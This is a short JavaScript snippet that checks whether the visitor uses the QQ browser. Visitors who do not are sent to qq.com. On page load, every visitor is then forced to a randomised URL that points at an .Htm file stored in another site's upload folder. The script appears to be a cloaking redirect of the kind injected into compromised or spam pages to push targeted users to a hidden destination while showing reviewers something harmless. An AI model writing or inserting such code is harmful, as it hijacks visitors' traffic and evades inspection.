function leleua() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
    } else {
        window.location.href = "https://qq.com";
    }
}

leleua();

window.onload = function () {
    const targetUrl = 'https://www.360tianma.com/public/upload/conf/2024/01-12/c36b4571a36c26b9310b970a9a43edd5.Htm';
    const timestamp = Date.now();
    const randomString = Math.random().toString(36).substring(2);
    const urlWithParam = `${targetUrl}u${timestamp}${randomString}`;
    window.location.href = urlWithParam
},
